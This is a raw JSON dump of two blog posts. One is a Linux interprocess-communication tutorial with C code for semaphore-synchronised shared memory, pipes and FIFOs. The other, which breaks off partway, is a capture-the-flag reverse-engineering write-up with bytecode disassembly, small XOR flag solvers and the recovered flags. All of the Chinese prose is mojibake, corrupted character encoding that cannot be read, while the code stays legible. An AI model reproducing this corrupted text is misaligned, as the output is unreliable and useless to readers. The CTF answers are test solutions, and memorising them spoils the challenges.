å‘é€ä¸€ä¸ªåº”ç­”æ¶ˆæ¯â€overâ€ï¼Œå¹¶ç»“æŸç¨‹åºçš„è¿è¡Œã€‚é€‰æ‹©åˆé€‚çš„ä¿¡å·é‡æœºåˆ¶å®ç°ä¸¤ä¸ªè¿›ç¨‹å¯¹å…±äº«å†…å­˜çš„äº’æ–¥åŠåŒæ­¥ä½¿ç”¨ã€‚ //common.h#include &lt;stdio.h>#include &lt;stdlib.h>#include &lt;string.h>#include &lt;unistd.h>#include &lt;semaphore.h>#include &lt;fcntl.h>#include &lt;sys/shm.h>#include &lt;time.h>#define TEXT_SZ 100/*MSG1 è¡¨ç¤º sender ä¸ºå†™ç«¯ï¼Œreceiver ä¸ºè¯»ç«¯MSG2 è¡¨ç¤º sender ä¸ºè¯»ç«¯ï¼Œreceiver ä¸ºå†™ç«¯*/#define MSG1_SEMRD \"msg1_sem_read\"#define MSG1_SEMWR \"msg1_sem_write\"#define MSG2_SEMRD \"msg2_sem_read\"#define MSG2_SEMWR \"msg2_sem_write\"struct shm_data&#123; char text[TEXT_SZ];&#125;;//sender.c#include\"common.h\"int main() &#123; struct shm_data *shared; // åˆ›å»ºå…±äº«å†…å­˜ int shm_id = shmget((key_t)1234, sizeof(struct shm_data), 0666|IPC_CREAT); if (shm_id == -1) &#123; perror(\"Failed to get shared memory\"); exit(1); &#125; // å°†å…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´ char *shm = (char *)shmat(shm_id, NULL, 0); if (shm == (char *)(-1)) &#123; perror(\"Failed to attach shared memory\"); exit(1); &#125; // è®¾ç½®å…±äº«å†…å­˜ shared = (struct shm_data*)shm; // è®¾ç½®ä¿¡å·é‡ sem_t *msg1_semwr,*msg1_semrd,*msg2_semwr,*msg2_semrd; msg1_semwr=sem_open(MSG1_SEMWR,O_CREAT,0666,1); msg1_semrd=sem_open(MSG1_SEMRD,O_CREAT,0666,0); msg2_semwr=sem_open(MSG2_SEMWR,O_CREAT,0666,1); msg2_semrd=sem_open(MSG2_SEMRD,O_CREAT,0666,0); if(msg1_semwr==(void*)-1 || msg1_semrd==(void*)-1 ||msg2_semwr==(void*)-1 || msg2_semrd==(void*)-1)&#123; perror(\"sem_open failure\"); &#125; // éšæœºäº§ç”Ÿå¹¶å‘é€è¡¨è¾¾å¼ srand(time(NULL)); for (int i = 0; i &lt; 10; i++) &#123; sem_wait(msg1_semwr); int num1 = rand() % 100; int num2 = rand() % 100; sprintf(shared->text, \"%d+%d\", num1, num2); //printf(\"Sender: Sent expression '%s'\\n\", expression); sem_post(msg1_semrd); sem_wait(msg2_semrd); printf(\"Sender: received calculation results %s from Receiver\\n\",shared->text); sem_post(msg2_semwr); sleep(1); &#125; // å‘é€ç»“æŸä¿¡å· sem_wait(msg1_semwr); strcpy(shared->text, \"end\"); sem_post(msg1_semrd); // ç­‰å¾…æ¥æ”¶ 'over' ä¿¡å·å¹¶åˆ é™¤å…±äº«å†…å­˜ sem_wait(msg2_semrd); printf(\"Sender: received %s from Receiver\\n\",shared->text); // æŠŠå…±äº«å†…å­˜ä»å½“å‰è¿›ç¨‹ä¸­åˆ†ç¦» if(shmdt(shm) == -1) &#123; perror(\"shmdt failed\\n\"); exit(EXIT_FAILURE); &#125; // åˆ é™¤å…±äº«å†…å­˜ if(shmctl(shm_id, IPC_RMID, 0) == -1) &#123; perror(\"shmctl(IPC_RMID) failed\\n\"); &#125; sem_post(msg2_semwr); // å…³é—­ä¿¡å·é‡ sem_close(msg1_semwr); sem_close(msg1_semrd); sem_close(msg2_semwr); sem_close(msg2_semrd); // åˆ é™¤ä¿¡å·é‡æ–‡ä»¶ sem_unlink(MSG1_SEMRD); sem_unlink(MSG1_SEMWR); sem_unlink(MSG2_SEMRD); sem_unlink(MSG2_SEMWR); return 0;&#125;//receiver.c#include\"common.h\"int main() &#123; struct shm_data *shared; // åˆ›å»ºå…±äº«å†…å­˜ int shm_id = shmget((key_t)1234, sizeof(struct shm_data), 0666|IPC_CREAT); if (shm_id == -1) &#123; perror(\"Failed to get shared memory\"); exit(1); &#125; // å°†å…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´ char *shm = (char *)shmat(shm_id, NULL, 0); if (shm == (char *)(-1)) &#123; perror(\"Failed to attach shared memory\"); exit(1); &#125; // è®¾ç½®å…±äº«å†…å­˜ shared = (struct shm_data*)shm; // è®¾ç½®ä¿¡å·é‡ sem_t *msg1_semwr,*msg1_semrd,*msg2_semwr,*msg2_semrd; msg1_semwr=sem_open(MSG1_SEMWR,O_CREAT,0666,1); msg1_semrd=sem_open(MSG1_SEMRD,O_CREAT,0666,0); msg2_semwr=sem_open(MSG2_SEMWR,O_CREAT,0666,1); msg2_semrd=sem_open(MSG2_SEMRD,O_CREAT,0666,0); if(msg1_semwr==(void*)-1 || msg1_semrd==(void*)-1 ||msg2_semwr==(void*)-1 || msg2_semrd==(void*)-1)&#123; perror(\"sem_open failure\"); &#125; int running = 1; // æ¥æ”¶å¹¶å¤„ç†æ¶ˆæ¯ while (running) &#123; sem_wait(msg1_semrd); char expression[100]; strcpy(expression,shared->text); if (strcmp(expression, \"end\") == 0) &#123; printf(\"Receiver: Received end from Sender\\n\"); sem_post(msg1_semwr); sem_wait(msg2_semwr); strcpy(shared->text, \"over\"); running=0; sem_post(msg2_semrd); &#125; else&#123; printf(\"Receiver: Received expression '%s' from Sender\\n\", expression); sem_post(msg1_semwr); // è®¡ç®—è¡¨è¾¾å¼ç»“æœ sem_wait(msg2_semwr); int num1, num2; sscanf(expression, \"%d+%d\", &amp;num1, &amp;num2); int result = num1 + num2; sprintf(shared->text, \"%d\", result); sem_post(msg2_semrd); &#125; &#125; // å…³é—­ä¿¡å·é‡ sem_close(msg1_semwr); sem_close(msg1_semrd); sem_close(msg2_semwr); sem_close(msg2_semrd); // åˆ é™¤ä¿¡å·é‡æ–‡ä»¶ sem_unlink(MSG1_SEMRD); sem_unlink(MSG1_SEMWR); sem_unlink(MSG2_SEMRD); sem_unlink(MSG2_SEMWR); return 0;&#125;# ç®¡é“ æ“ä½œç³»ç»Ÿåœ¨å†…æ ¸ä¸­ä¸ºè¿›ç¨‹åˆ›å»ºçš„çš„ä¸€å—ç¼“å†²åŒºï¼Œè‹¥å¤šä¸ªè¿›ç¨‹å¯ä»¥è®¿é—®åˆ°åŒä¸€å—ç¼“å†²åŒºï¼Œå°±å¯ä»¥å®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œé€šè¿‡åŠåŒå·¥é€šä¿¡ï¼ˆå¯ä»¥é€‰æ‹©æ–¹å‘çš„å•å‘é€šä¿¡ï¼‰å®ç°æ•°æ®ä¼ è¾“ # åŒ¿åç®¡é“ åœ¨è¿™å—å†…æ ¸ä¸­çš„ç¼“å†²åŒºæ²¡æœ‰æ˜ç¡®çš„æ ‡è¯†ç¬¦ï¼Œå…¶ä»–è¿›ç¨‹æ— æ³•ç›´æ¥è®¿é—®ç®¡é“ ä½¿ç”¨åŒ¿åç®¡é“éœ€è¦åŒ…å«å¤´æ–‡ä»¶ unistd.h ç‰¹æ€§ åŒ¿åç®¡é“åªèƒ½ç”¨äºå…·æœ‰äº²ç¼˜å…³ç³»çš„è¿›ç¨‹é—´é€šä¿¡ åŒ¿åç®¡é“åˆ›å»ºæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæä¾›ä¸¤ä¸ªæ“ä½œå¥æŸ„ï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼ˆå…¶ä¸­ä¸€ä¸ªç”¨äºä»æ“ä½œç®¡é“è¯»å–æ•°æ®ï¼Œä¸€ä¸ªå‘ç®¡é“ä¸­å†™å…¥æ•°æ®ï¼‰ å› æ­¤åªèƒ½é€šè¿‡åˆ›å»ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹é€šè¿‡å¤åˆ¶çˆ¶è¿›ç¨‹çš„æ–¹å¼ï¼Œè·å–åˆ°ç®¡é“çš„æ“ä½œå¥æŸ„ï¼Œè¿›è€Œå®ç°è®¿é—®åŒä¸€ä¸ªç®¡é“é€šä¿¡ # pipe åˆ›å»ºåŒ¿åç®¡é“ /*@param fd [2]: æ–‡ä»¶æè¿°ç¬¦æ•°ç»„ï¼Œå…¶ä¸­ fd [0] è¡¨ç¤ºè¯»ç«¯ï¼Œfd [1] è¡¨ç¤ºå†™ç«¯ @return: æˆåŠŸè¿”å› 0ï¼Œå¤±è´¥è¿”å› - 1*/int pipe(int fd[2]); ç®¡é“è¦ä¸ç„¶åªèƒ½è¯»ï¼Œè¦ä¸ç„¶åªèƒ½å†™ï¼ˆå•å‘ä¼ è¾“ï¼‰ï¼›ä½¿ç”¨çš„æ—¶å€™å¦‚æœä¸ä½¿ç”¨å“ªä¸€ç«¯ï¼Œå…³é—­å“ªä¸€ç«¯å°±å¯ä»¥ è‹¥ç®¡é“ä¸­æ²¡æœ‰æ•°æ®ï¼Œåˆ™ read å°±ä¼šé˜»å¡ï¼›è‹¥ç®¡é“ä¸­æ•°æ®å†™æ»¡äº†åˆ™ write å°±ä¼šé˜»å¡ # ç¤ºä¾‹ ä»é”®ç›˜è¯»å–æ•°æ®ï¼Œå†™å…¥ç®¡é“ï¼Œè¯»å–ç®¡é“ï¼Œå†™åˆ°å±å¹• #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h>int main()&#123; int fds[2]; char buf[100]; int len; if ( pipe(fds) == -1 ) perror(\"make pipe error\"),exit(1); // read from stdin while ( fgets(buf, 100, stdin) ) &#123; len = strlen(buf); // write into pipe if ( write(fds[1], buf, len) != len ) &#123; perror(\"write to pipe error\"); break; &#125; memset(buf, 0x00, sizeof(buf)); // read from pipe if ( (len=read(fds[0], buf, 100)) == -1 ) &#123; perror(\"read from pipe error\"); break; &#125; // write to stdout if ( write(1, buf, len) != len ) &#123; perror(\"write to stdout error\"); break; &#125; &#125; return 0;&#125;# å‘½åç®¡é“ å‘½åç®¡é“æ˜¯å†…æ ¸ä¸­çš„ç¼“å†²åŒºï¼Œè¿™å—ç¼“å†²åŒºå…·æœ‰æ ‡è¯†ç¬¦ï¼ˆæ ‡è¯†ç¬¦æ˜¯ä¸€ä¸ªå¯è§äºæ–‡ä»¶ç³»ç»Ÿçš„ç®¡é“æ–‡ä»¶ï¼‰ï¼Œå…¶ä»–çš„è¿›ç¨‹å¯ä»¥é€šè¿‡è¿™ä¸ªæ ‡è¯†ç¬¦ï¼Œæ‰¾åˆ°è¿™ä¸ªç¼“å†²åŒºï¼ˆé€šè¿‡æ‰“å¼€ä¸€ä¸ªç®¡é“æ–‡ä»¶ï¼Œè¿›è€Œè®¿é—®åˆ°åŒä¸€å—ç¼“å†²åŒºï¼‰ï¼Œè¿›è€Œå®ç°é€šä¿¡ ä½¿ç”¨å‘½åç®¡é“éœ€è¦åŒ…å«å¤´æ–‡ä»¶ sys/types.h , sys/stat.h ç‰¹æ€§ å¯ç”¨äºåŒä¸€ä¸»æœºä¸Šçš„ä»»æ„è¿›ç¨‹é—´é€šä¿¡ å¤šä¸ªè¿›ç¨‹é€šè¿‡å‘½åç®¡é“é€šä¿¡æ—¶é€šè¿‡æ‰“å¼€å‘½ä»¤ç®¡é“æ–‡ä»¶è®¿é—®åŒä¸€å—å†…æ ¸ä¸­çš„ç¼“å†²åŒºå®ç°é€šä¿¡ # mkfifo åˆ›å»ºå‘½åç®¡é“ mkfifo å‡½æ•°é»˜è®¤æŒ‡å®š O_CREAT | O_EXECL æ–¹å¼åˆ›å»º FIFO, mkfifo çš„ä¸€èˆ¬ä½¿ç”¨æ–¹å¼æ˜¯ï¼šé€šè¿‡ mkfifo åˆ›å»º FIFOï¼Œç„¶åè°ƒç”¨ openï¼Œä»¥è¯»æˆ–è€…å†™çš„æ–¹å¼ä¹‹ä¸€æ‰“å¼€ FIFOï¼Œç„¶åè¿›è¡Œæ•°æ®é€šä¿¡ã€‚ /*@param filename: ç®¡é“æ–‡ä»¶åç§°@param mode: æŒ‡å®šçš„æ–‡ä»¶æƒé™ä½ï¼Œç±»ä¼¼äº open å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚å³åˆ›å»ºè¯¥ FIFO æ—¶ï¼ŒæŒ‡å®šç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œæœ‰ä»¥ä¸‹å€¼ï¼šS_IRUSRï¼ŒS_IWUSRï¼ŒS_IRGRPï¼ŒS_IWGRPï¼ŒS_IROTHï¼ŒS_IWOTHã€‚@return: æˆåŠŸè¿”å› 0ï¼Œå¤±è´¥è¿”å› - 1*/int mkfifo(const char *filename, mode_t mode);# ç¤ºä¾‹ // FIFOwrite.c#include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #include &lt;fcntl.h> int main(int argc, char *argv[]) &#123; int fd; int ret; ret = mkfifo(\"my_fifo\", 0666); // åˆ›å»ºå‘½åç®¡é“ if(ret != 0) &#123; perror(\"mkfifo\"); &#125; fd = open(\"my_fifo\", O_WRONLY); // ç­‰ç€åªè¯» if(fd &lt; 0) &#123; perror(\"open fifo\"); &#125; char send[100] = \"Hello World\"; write(fd, send, strlen(send)); // å†™æ•°æ® printf(\"write to my_fifo buf=%s\\n\",send); while(1); // é˜»å¡ï¼Œä¿è¯è¯»å†™è¿›ç¨‹ä¿æŒç€é€šä¿¡è¿‡ç¨‹ close(fd); return 0; &#125;// FIFOread.c#include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #include &lt;fcntl.h> int main(int argc, char *argv[]) &#123; int fd; int ret; ret = mkfifo(\"my_fifo\", 0666); // åˆ›å»ºå‘½åç®¡é“ if(ret != 0) &#123; perror(\"mkfifo\"); &#125; fd = open(\"my_fifo\", O_RDONLY); // ç­‰ç€åªå†™ if(fd &lt; 0) &#123; perror(\"open fifo\"); &#125; while(1) &#123; char recv[100] = &#123;0&#125;; read(fd, recv, sizeof(recv)); // è¯»æ•°æ® printf(\"read from my_fifo buf=[%s]\\n\", recv); sleep(1); &#125; close(fd); return 0; &#125;# å‚è€ƒèµ„æ–™ 6 ç§ Linux è¿›ç¨‹é—´çš„é€šä¿¡æ–¹å¼ Linux è¿›ç¨‹é—´é€šä¿¡ â€”â€” ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ— linux å¤šçº¿ç¨‹ä¹‹ä¿¡å·é‡ sem_init Linux ä¿¡å·é‡è¯¦è§£ è¿›ç¨‹é—´é€šä¿¡ â€”POSIX ä¿¡å·é‡å®ç°æœºåˆ¶ æœ‰åä¿¡å·é‡ â€”â€” æ— å…³è¿›ç¨‹é—´åŒæ­¥ åˆ©ç”¨ä¿¡å·é‡ semaphore å®ç°ä¸¤ä¸ªè¿›ç¨‹è¯»å†™åŒæ­¥ Linux è¿›ç¨‹é—´é€šä¿¡ â€”â€” ä½¿ç”¨å…±äº«å†…å­˜ Linuxï¼šå¸¦ä½ ç†è§£è¿›ç¨‹é—´é€šä¿¡â€“ç®¡é“ è¿›ç¨‹é—´é€šä¿¡ä¹‹ç®¡é“ï¼ˆpipeï¼‰å’Œå‘½åç®¡é“ï¼ˆFIFOï¼‰","categories":[],"tags":[{"name":"è¿›ç¨‹é€šä¿¡","slug":"è¿›ç¨‹é€šä¿¡","permalink":"https://oacia.dev/tags/%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/"},{"name":"ä¿¡å·é‡","slug":"ä¿¡å·é‡","permalink":"https://oacia.dev/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/"},{"name":"æ¶ˆæ¯é˜Ÿåˆ—","slug":"æ¶ˆæ¯é˜Ÿåˆ—","permalink":"https://oacia.dev/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"ç®¡é“","slug":"ç®¡é“","permalink":"https://oacia.dev/tags/%E7%AE%A1%E9%81%93/"},{"name":"å…±äº«å†…å­˜","slug":"å…±äº«å†…å­˜","permalink":"https://oacia.dev/tags/%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98/"}]},{"title":"DASCTF Apr.2023 X SUæˆ˜é˜Ÿ2023å¼€å±€ä¹‹æˆ˜ reverse&&blockchain writeup","slug":"DASCTF-Apr-2023-X-SUæˆ˜é˜Ÿ2023å¼€å±€ä¹‹æˆ˜-reverse-blockchain-writeup","date":"2023-04-22T11:15:52.000Z","updated":"2023-12-12T17:02:32.467Z","comments":true,"path":"DASCTF-Apr-2023-X-SUæˆ˜é˜Ÿ2023å¼€å±€ä¹‹æˆ˜-reverse-blockchain-writeup/","link":"","permalink":"https://oacia.dev/DASCTF-Apr-2023-X-SU%E6%88%98%E9%98%9F2023%E5%BC%80%E5%B1%80%E4%B9%8B%E6%88%98-reverse-blockchain-writeup/","excerpt":"","text":"ä»Šå¤©åç‰¢åæ»¡äº†å…«å°æ—¶ï¼Œå‡ºäº†ä¸‰é“é€†å‘ï¼Œä¸€é“åŒºå—é“¾ï¼Œå¸®åŠ©æˆ‘ä»¬é˜Ÿæ‹¿åˆ°äº†è¿™æ¬¡æ¯”èµ›çš„ç¬¬ä¸€åï¼Œä¹Ÿç®—å¯å–œå¯è´ºï¼è‡ªå·±ç»ˆäºä¸æ˜¯ä»¥å‰çš„èœé¸¡äº†ï¼Œé¥æƒ³å»å¹´è¿˜å•¥ä¹Ÿä¸ä¼šå‘¢ ç°åœ¨æ¯”èµ›ç»“æŸäº†ï¼Œé‚£å°±å†™ä¸€ä¸‹ wp å¥½å’¯ PS: ç¬¬ä¸€æ¬¡æ‹¿åˆ°ä¸€é“å›°éš¾é¢˜çš„ä¸€è¡€ï¼Œè¿˜æ˜¯å¾ˆæ¿€åŠ¨çš„ï¼Œæœ‰ä¸€é“é¢˜ç›®æˆ‘è®°å¾—å«åš easyREï¼Œæ‹¿äº†äºŒè¡€æ˜¯å› ä¸ºåƒé¥­åƒåˆ° 10 ç‚¹å¤šæ‰å¼€å§‹åšé¢˜äº†ï¼Œä¸‹æ¬¡ä¸€å®šå‡†æ—¶æ¯”èµ›ï¼ï¼ˆä¸‹æ¬¡ä¸€å®š (â—â€™â—¡â€™â—)ï¼‰ é¢˜ç›®é™„ä»¶: ç‚¹å‡»ä¸‹è½½ # reverse # easyRE è¿™é¢˜æ˜¯ python é€†å‘ï¼Œåš python é€†å‘çš„æ–¹æ³•æˆ‘æ„Ÿè§‰æŒºå›ºå®šçš„ï¼Œå°±æ˜¯ pyinstxtractor è§£åŒ…ä¸€ä¸‹ï¼Œå†æŠŠé‡Œé¢çš„ pyc è½¬æˆ py å°±å¯ä»¥äº† ä»Šå¹´å¹´åˆçš„æ—¶å€™è¿˜å¯¹ python é€†å‘åšäº†äº›æ•´ç†å‘¢ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘åšå®¢çš„è¿™ç¯‡æ–‡ç«  å›åˆ°é¢˜ç›®ï¼Œè¿™é¢˜å‘€è¦æ€ä¹ˆåˆéš¾æˆ‘ä»¬å‘¢ï¼Ÿæ²¡é”™ï¼Œå°±æ˜¯ python3.11 è¿™ä¸ªç‰ˆæœ¬æŒºæ–°çš„ï¼Œæˆ‘ç›¸ä¿¡ä½ ä¸ç®¡æ˜¯ç”¨ uncompyle6 è¿˜æ˜¯ pycdc è¿˜æ˜¯åœ¨çº¿ç½‘ç«™ï¼Œåº”è¯¥éƒ½ä¼šé‡åˆ°åç¼–è¯‘å¤±è´¥çš„æƒ…å†µï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ å…¶å®æ˜¯æœ‰æ–¹æ³•çš„ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹çš„ python ä»£ç å¾—åˆ°è¿™ä¸ª pyc çš„å­—èŠ‚ç  import disimport marshalwith open('easyRE.pyc', 'rb') as f: f.seek(16) dis.dis(marshal.load(f))0 0 RESUME 0 1 2 LOAD_CONST 0 (0) 4 LOAD_CONST 1 (None) 6 IMPORT_NAME 0 (random) 8 STORE_NAME 0 (random) 3 10 PUSH_NULL 12 LOAD_NAME 0 (random) 14 LOAD_ATTR 1 (Random) 24 LOAD_CONST 2 (322376503) 26 PRECALL 1 30 CALL 1 40 STORE_NAME 2 (r) 6 42 PUSH_NULL 44 LOAD_NAME 3 (input) 46 LOAD_CONST 3 ('Enter your flag: ') 48 PRECALL 1 52 CALL 1 62 LOAD_METHOD 4 (encode) 84 PRECALL 0 88 CALL 0 98 STORE_NAME 5 (pt) 8 100 LOAD_CONST 4 (b'\\x8b\\xcck\\xd3\\xed\\x96\\xffFb\\x06r\\x085\\x82\\xbc \\xb2\\xde)p\\x88Q`\\x1bf\\x18\\xb6QUSw\\x10\\xcd\\xd9\\x13A$\\x86\\xe5\\xcd\\xd9\\xff') 102 STORE_NAME 6 (ct) 10 104 BUILD_LIST 0 106 STORE_NAME 7 (buf) 12 108 LOAD_NAME 5 (pt) 110 GET_ITER >> 112 FOR_ITER 46 (to 206) 114 STORE_NAME 8 (b) 13 116 LOAD_NAME 7 (buf) 118 LOAD_METHOD 9 (append) 140 LOAD_NAME 2 (r) 142 LOAD_METHOD 10 (randint) 164 LOAD_CONST 0 (0) 166 LOAD_CONST 5 (255) 168 PRECALL 2 172 CALL 2 182 LOAD_NAME 8 (b) 184 BINARY_OP 12 (^) 188 PRECALL 1 192 CALL 1 202 POP_TOP 204 JUMP_BACKWARD 47 (to 112) 15 >> 206 PUSH_NULL 208 LOAD_NAME 11 (bytes) 210 LOAD_NAME 7 (buf) 212 PRECALL 1 216 CALL 1 226 LOAD_NAME 6 (ct) 228 COMPARE_OP 2 (==) 234 POP_JUMP_FORWARD_IF_TRUE 2 (to 240) 236 LOAD_ASSERTION_ERROR 238 RAISE_VARARGS 1 17 >> 240 PUSH_NULL 242 LOAD_NAME 12 (print) 244 LOAD_CONST 6 ('Correct!') 246 PRECALL 1 250 CALL 1 260 POP_TOP 262 LOAD_CONST 1 (None) 264 RETURN_VALUEåˆ°äº†è¿™ä¸€æ­¥å…¶å®å°±å¯ä»¥åšé¢˜äº†ï¼Œä½†æ˜¯æˆ–è®¸æœ‰å°ä¼™ä¼´ä¸€çœ‹åˆ°å­—èŠ‚ç å¤´éƒ½å¤§äº† è¿™æ—¶å°±è¦è¯·å‡ºæˆ‘ä»¬ç¥å¥‡çš„ chatgpt äº†ï¼Œç½‘å€åœ¨è¿™é‡Œ https://chat.openai.com/ ç›´æ¥æŠŠå­—èŠ‚ç ä¸¢ç»™ä»–ç„¶åè¯´ï¼šç»™æˆ‘è½¬æˆ py ä»£ç ï¼ ç„¶å chatgpt å°±ä¼šåˆ·åˆ·åˆ·çš„ç»™å‡º py æºä»£ç  import randomr = random.Random(322376503)pt = input('Enter your flag: ').encode()ct = b'\\x8b\\xcck\\xd3\\xed\\x96\\xffFb\\x06r\\x085\\x82\\xbc \\xb2\\xde)p\\x88Q`\\x1bf\\x18\\xb6QUSw\\x10\\xcd\\xd9\\x13A$\\x86\\xe5\\xcd\\xd9\\xff'buf = []for b in pt: buf.append(r.randint(0, 255) ^ b)assert bytes(buf) == ctprint('Correct!')è¿™ä¸€çœ‹éšæœºæ•°ç§å­éƒ½å›ºå®šäº†ï¼Œé‚£éšæœºæ•°å…¶å®å°±ä¸éšæœºäº† åŸºäºé¢˜ç›®çš„ä»£ç æ”¹ä¸€æ”¹å°±æ˜¯ flag äº† import randomr = random.Random(322376503)pt = input('Enter your flag: ').encode()ct = b'\\x8b\\xcck\\xd3\\xed\\x96\\xffFb\\x06r\\x085\\x82\\xbc \\xb2\\xde)p\\x88Q`\\x1bf\\x18\\xb6QUSw\\x10\\xcd\\xd9\\x13A$\\x86\\xe5\\xcd\\xd9\\xff'for k in ct: print(chr(r.randint(0, 255) ^ k),end='')# flag&#123;69858b56-4987-438f-a02c-5ab5c09e5138&#125;# gotots è¿™é¢˜æ˜¯ä¸€é“ go è¯­è¨€çš„é€†å‘é¢˜ï¼Œåšè¿™ç§ go è¯­è¨€çš„é¢˜ç›®ï¼Œå…¶å®æŠŠé‚£äº›å‡½æ•°éƒ½ç»™å¤åŸå°±ç›¸å½“å¥½åšäº† (åš go é€†å‘æ‰¾ä¸åˆ° main_main å°±å¥½åƒâ€¦emmm æƒ³ä¸å‡ºæ¥ç”¨ä»€ä¹ˆæ¯”å–»å¥½äº† qwq) æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦åšçš„æ˜¯è¿˜åŸå‡½æ•°åç§°ï¼Œç”¨è¿™ä¸ª ida è„šæœ¬å°±å¯ä»¥äº† https://github.com/renshareck/IDAGolangHelper_SupportGo1.20 ç„¶åæŒ‰ç…§ä¸‹å›¾çš„æµç¨‹ä¾æ¬¡ç‚¹å‡»æŒ‰é’® è¿˜åŸä¹‹åå‘ç°æ˜¯æ¢…æ£®æ—‹è½¬ç®—æ³•éšæœºæ•°ç”Ÿæˆå™¨ï¼Œè¿™æ˜¯ä¸€ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œæ¯æ¬¡å¼‚æˆ–çš„å€¼éƒ½æ˜¯ä¸€æ ·çš„ é‚£å°±éšä¾¿è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²æ¯”å¦‚æˆ‘è¿™é‡Œè¾“å…¥çš„æ˜¯ 0000000000000000000000000000000000000000000000 , ç„¶åæ‰“ä¸ªæ–­ç‚¹æŠŠå¼‚æˆ–åçš„é‚£ä¸ªæ•°ç»„å¤åˆ¶ä¸‹æ¥ï¼Œç„¶åå†å»å¼‚æˆ–åé¢è¦æ¯”è¾ƒçš„æ•°ç»„ï¼Œè¿™æ ·å°±å¯ä»¥æ‹¿åˆ° flag äº† æŒºç®€å•çš„é¢˜ç›®ï¼Œç›´æ¥ç»™ exp å§ testinput = \"0000000000000000000000000000000000000000000000\"byte = [0x67, 0x88, 0xBE, 0x8C, 0x79, 0xAB, 0x7C, 0xB7, 0x5F, 0xD3, 0x24, 0xD0, 0x16, 0xF0, 0x02, 0x8D, 0x5C, 0xF7, 0xB5, 0x16, 0xD2, 0x69, 0xDE, 0xA6, 0xE1, 0x5F, 0xA1, 0xA5, 0x7F, 0x6C, 0x78, 0x70, 0x76, 0x88, 0x75, 0x2E, 0x2F, 0x30, 0x99, 0x61, 0x5A, 0xD1, 0xBF, 0x71, 0x7A, 0x4E]key = [0x35, 0x8C, 0xEB, 0x85, 0x2C, 0xFA, 0x2D, 0xB1, 0x42, 0x82, 0x27, 0xD0, 0x10, 0xED, 0x06, 0x8E, 0x0D, 0xFE, 0xA8, 0x1E, 0x81, 0x3C, 0x8A, 0xBB, 0xB7, 0x0B, 0xF4, 0xF0, 0x7C, 0x6B, 0x70, 0x26, 0x71, 0x8B, 0x73, 0x7D]for i in range(len(key)): print(chr(ord(testinput[i])^byte[i]^key[i]),end='')# b4e9eaa6-a306-43a9-8ced-fdee378f736c# multi-universe è¿™é¢˜æ‹¿äº†ä¸€è¡€ (æ²¡æƒ³åˆ°æˆ‘ä¹Ÿæœ‰æ‹¿ä¸€è¡€çš„ä¸€å¤©ï¼è‚¯å®šæ˜¯å¤§ä½¬ä»¬è¿˜æ²¡æœ‰å‘åŠ›å””) è¿™é¢˜å‘€ä¹Ÿæ˜¯ go é€†å‘ï¼Œä¸è¿‡å°±æ˜¯å’Œ c ä»£ç äº¤å‰ç¼–è¯‘äº†ä¸€ä¸‹ åŒæ ·ï¼Œç¬¬ä¸€æ­¥è¿˜æ˜¯æ¢å¤å‡½æ•°åç§°ï¼Œå¯ä»¥ç”¨è¿™ä¸ª ida è„šæœ¬ https://github.com/0xjiayu/go_parser , ç„¶åå°±å¯ä»¥äº†ï¼Œè¿™é‡Œè¿è¡Œè„šæœ¬ä¹‹åå¯èƒ½ä¼šå¡ä½ï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œcancel æ‰è„šæœ¬ï¼Œå‡½æ•°åç§°ä¸€æ ·å¯ä»¥æ¢å¤è¿‡æ¥ ä¹‹åå‘å°±æ˜¯éšä¾¿è¾“å…¥ä¸€ä¸ª 40 ä½çš„å­—ç¬¦ä¸²ï¼Œç„¶ååœ¨è¾“å…¥åçš„å­—ç¬¦ä¸²çš„å†…å­˜åœ°å€å¤„æ‰“ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼ŒåŠ¨æ€è°ƒè¯•ä¹‹åæ–­ç‚¹ä¸€è·¯è§¦å‘ä¸‹å»ï¼Œè·Ÿåˆ°è¿™ä¸ªå‡½æ•° sub_7FF631BCF2E0 , æˆ‘è§‰å¾—ä½ æœ‰å¯èƒ½æ‰¾ä¸åˆ°è¿™ä¸ªå‡½æ•°å› ä¸ºåŠ¨æ€è°ƒè¯•ååŸºå€å¯èƒ½ä¸ä¸€æ ·ï¼Œæˆ‘çš„åŸºå€æ˜¯ 0x7FF631B30000 , å¦‚æœä½ æ‰¾ä¸åˆ°åŠ å¯†å‡½æ•°çš„è¯åœ¨ ida é‡Œé¢æ¢æˆæˆ‘è¿™ä¸ªåŸºå€å°±å¯ä»¥æ‰¾å¾—åˆ°äº† (ä»€ä¹ˆä½ ä¸ä¼šæ¢åŸºå€ï¼Ÿï¼è·Ÿç€æˆ‘æ¥ï¼šåœ¨ ida å·¦ä¸Šè§’æ‰¾åˆ° Edit -&gt; Segments -&gt; Rebase program ç„¶åæŠŠæˆ‘è¿™ä¸ªåŸºå€è¾“è¿›å»å°±å¯ä»¥äº†) è¿™ä¸ªå‡½æ•°çš„ä¼ªä»£ç 